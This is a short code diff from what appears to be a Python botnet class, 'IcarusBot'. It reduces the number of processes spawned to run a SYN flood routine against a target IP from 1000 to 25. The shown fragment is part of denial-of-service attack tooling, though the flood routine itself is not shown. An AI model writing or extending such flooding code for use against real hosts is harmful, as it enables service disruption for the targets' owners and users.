@@ -204,7 +204,7 @@ class IcarusBot:
                             #                                   proc.terminate()  # sends a SIGTERM
 
                             # The following code is hilariously long and redundant, but who cares?
-                            for n in range(0, 1000):
+                            for n in range(0, 25):
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
